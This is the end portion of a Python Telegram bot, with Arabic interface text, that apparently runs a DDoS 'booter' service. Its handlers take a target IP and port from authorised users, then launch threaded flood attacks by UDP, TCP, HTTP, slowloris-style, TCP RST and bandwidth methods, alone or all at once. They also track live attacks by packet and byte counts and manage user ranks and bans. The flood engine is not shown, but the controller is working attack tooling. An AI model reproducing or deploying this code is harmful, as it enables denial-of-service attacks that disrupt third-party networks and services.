        ]), kb_back("menu:users"))
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, user_unban_flow)

    # ---------------- METHODS ----------------
    elif d.startswith("m:"):
        if not AUTH.can(uid, "attack"):
            try: bot.answer_callback_query(call.id, "⛔")
            except: pass
            return
        ST.user_method = d.split(":", 1)[1]
        safe_edit(call, "\n".join([
            U.frame(f"الميثود: {ST.user_method}"),
            "أرسل الهدف:",
            "IP PORT",
            "مثال:",
            "1.2.3.4 80",
            U.frame("SAJIN"),
        ]), kb_back("menu:attack"))
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, receive_target)

    # ---------------- THREADS ----------------
    elif d.startswith("th:"):
        n = int(d.split(":")[1])
        ST.user_threads = n
        try: bot.answer_callback_query(call.id, f"{n}")
        except: pass
        safe_edit(call, "\n".join([
            U.frame("الإعدادات"),
            f"الثريدات: {n}",
            U.frame("SAJIN"),
        ]), kb_settings())

    # ---------------- STOP ----------------
    elif d == "act:stopall":
        if not AUTH.can(uid, "stopall"): return
        n = stop_all()
        try: bot.answer_callback_query(call.id, f"تم إيقاف {n}")
        except: pass

    elif d.startswith("act:stop:"):
        aid = d.split(":")[2]
        eng = ST.attacks.pop(aid, None)
        if eng:
            eng.stop()
            a = S.stop(aid)
            if a: DB.attack_end(aid, a["packets"], a["bytes"])
            try: bot.answer_callback_query(call.id, f"تم إيقاف {aid}")
            except: pass

# =============================================================================
# [14] USER MANAGEMENT FLOWS
# =============================================================================
def user_add_flow(m):
    if not AUTH.can(m.from_user.id, "users"): return
    try:
        parts = m.text.split()
        uid = int(parts[0]); rank = parts[1].lower()
        if rank not in Rank.P:
            safe_send(m.chat.id, "رتبة غير معروفة"); return
        DB.user_put(uid, "", rank)
        DB.user_rank(uid, rank)
        AUTH._load(uid)
        safe_send(m.chat.id, f"تم إضافة {uid} كـ {rank}", kb_users())
    except:
        safe_send(m.chat.id, "صيغة خاطئة", kb_users())

def user_del_flow(m):
    if not AUTH.can(m.from_user.id, "users"): return
    try:
        uid = int(m.text.strip())
        DB.user_del(uid)
        with AUTH.lock: AUTH.cache.pop(uid, None)
        safe_send(m.chat.id, f"تم حذف {uid}", kb_users())
    except:
        safe_send(m.chat.id, "رقم خاطئ", kb_users())

def user_rank_flow(m):
    if not AUTH.can(m.from_user.id, "users"): return
    try:
        parts = m.text.split()
        uid = int(parts[0]); rank = parts[1].lower()
        if rank not in Rank.P:
            safe_send(m.chat.id, "رتبة خاطئة"); return
        DB.user_rank(uid, rank); AUTH._load(uid)
        safe_send(m.chat.id, f"رتبة {uid} = {rank}", kb_users())
    except:
        safe_send(m.chat.id, "صيغة خاطئة", kb_users())

def user_ban_flow(m):
    if not AUTH.can(m.from_user.id, "users"): return
    try:
        uid = int(m.text.strip())
        DB.user_ban(uid, 1); AUTH._load(uid)
        safe_send(m.chat.id, f"تم حظر {uid}", kb_users())
    except:
        safe_send(m.chat.id, "رقم خاطئ", kb_users())

def user_unban_flow(m):
    if not AUTH.can(m.from_user.id, "users"): return
    try:
        uid = int(m.text.strip())
        DB.user_ban(uid, 0); AUTH._load(uid)
        safe_send(m.chat.id, f"تم رفع الحظر عن {uid}", kb_users())
    except:
        safe_send(m.chat.id, "رقم خاطئ", kb_users())

# =============================================================================
# [15] LIVE VIEW
# =============================================================================
def show_live(cid, call=None):
    active = S.active_list()
    if not active:
        txt = U.frame("لا توجد هجمات نشطة")
        if call: safe_edit(call, txt, kb_back())
        else: safe_send(cid, txt, kb_back())
        return
    lines = [U.frame("الهجمات الحية")]
    for aid, a in active.items():
        dur = time.time() - a["start"]
        lines.append(f"{aid} {a['info']['ip']}:{a['info']['port']}")
        lines.append(f"   {a['info']['method']} · {int(dur)}s · {a['packets']:,}p · {human_b(a['bytes'])}")
    lines.append(U.frame("SAJIN"))
    txt = "\n".join(lines)
    if call: safe_edit(call, txt, kb_back())
    else: safe_send(cid, txt, kb_back())

# =============================================================================
# [16] TARGET RECEIVER
# =============================================================================
def receive_target(m):
    if not AUTH.ok(m.from_user.id): return
    if not AUTH.can(m.from_user.id, "attack"): return
    ip, port = parse_target(m.text or "")
    if not ip:
        safe_send(m.chat.id, "صيغة خاطئة. استخدم: IP PORT"); return

    method = ST.user_method or "UDP"

    # ALL = خليط كل الميثودات (توزيع)
    if method == "ALL":
        methods = ["UDP","UDP_MEGA","TCP","HTTP","SLOW","TCP_RST","UDP_BURST","BANDWIDTH"]
    else:
        methods = [method]

    ids = []
    for meth in methods:
        aid = State.nid()
        eng = Engine(ip, port, meth, aid, ST.user_threads, m.from_user.id)
        ST.attacks[aid] = eng
        S.new(aid, {"ip": ip, "port": port, "method": meth, "by": m.from_user.id, "uid": m.from_user.id})
        DB.attack_start(aid, ip, port, meth, m.from_user.id, ST.user_threads)
        DB.user_atk(m.from_user.id)
        threading.Thread(target=eng.run, daemon=True).start()
        ids.append(aid)

    txt = "\n".join([
        U.frame("تم الإطلاق"),
        f"الهدف  : {ip}:{port}",
        f"الميثود: {method}",
        f"الثريد : {ST.user_threads}",
        f"المعرّف: {', '.join(ids)}",
        U.frame("جاري التنفيذ"),
    ])
    kb = kb_stop_one(ids[0]) if ids else kb_back()
    safe_send(m.chat.id, txt, kb)

def stop_all():
    n = 0
    for aid, eng in list(ST.attacks.items()):
        try:
            eng.stop()
            a = S.stop(aid)
            if a: DB.attack_end(aid, a["packets"], a["bytes"])
            n += 1
        except: pass
        ST.attacks.pop(aid, None)
    return n

# =============================================================================
# [17] BOOT
# =============================================================================
def boot():
    # OK BOT ✅ فقط في التيرمنال
    sys.stdout.write("OK BOT ✅\n")
    sys.stdout.flush()

    try:
        bot.send_message(ADMIN_ID,
            f"{U.frame(f'{BOT_NAME} {VERSION}')}\n"
            f"الوضع: HELL MODE\n"
            f"الثريدات الافتراضية: {ST.user_threads}\n"
            f"المطور: {DEV_HANDLE}")
    except: pass

    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=20)
        except Exception:
            time.sleep(3)

if __name__ == "__main__":
    boot()